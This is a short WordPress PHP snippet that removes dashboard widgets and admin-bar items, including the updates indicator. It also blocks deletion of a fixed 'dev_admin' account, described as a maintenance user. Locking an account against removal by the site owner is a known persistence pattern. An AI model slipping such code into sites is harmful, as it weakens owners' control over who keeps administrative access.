<?php

/**
 * Remove dashboard widgets.
 */
function wpsh_dashboard_remove()
{
    remove_meta_box('dashboard_primary', get_current_screen(), 'side');
    remove_meta_box('dashboard_quick_press', get_current_screen(), 'side');
    remove_meta_box('dashboard_recent_comments', get_current_screen(), 'normal');
}

add_action('wp_network_dashboard_setup', 'wpsh_dashboard_remove', 20);
add_action('wp_user_dashboard_setup', 'wpsh_dashboard_remove', 20);
add_action('wp_dashboard_setup', 'wpsh_dashboard_remove', 20);

/**
 * Prevent deletion of the dev_admin maintenance user.
 *
 * @param array $caps    The user's capabilities.
 * @param string $cap     The capability being checked.
 * @param int    $user_id The user ID.
 * @param array $args    Additional arguments passed through the filter.
 * @return array         The user's capabilities, or an array with the single value
 *                       'do_not_allow' if the user cannot be deleted.
 */
function wpsh_prevent_specific_username_deletion($caps, $cap, $user_id, $args)
{

    if ($cap !== 'delete_user' && $cap !== 'delete_users') {
        return $caps;
    }

    if (isset($args[0])) {
        $user = get_user_by('id', $args[0]);

        if ($user && $user->user_login === 'dev_admin') {
            return array('do_not_allow');
        }
    }

    return $caps;
}

add_filter('map_meta_cap', 'wpsh_prevent_specific_username_deletion', 10, 4);


add_action('admin_bar_menu', function ($wp_admin_bar) {
    $wp_admin_bar->remove_node('wp-logo');
    $wp_admin_bar->remove_node('about');
    $wp_admin_bar->remove_node('wporg');
    $wp_admin_bar->remove_node('documentation');
    $wp_admin_bar->remove_node('support-forums');
    $wp_admin_bar->remove_node('feedback');
    $wp_admin_bar->remove_node('updates');
    $wp_admin_bar->remove_node('comments');
}, 999);
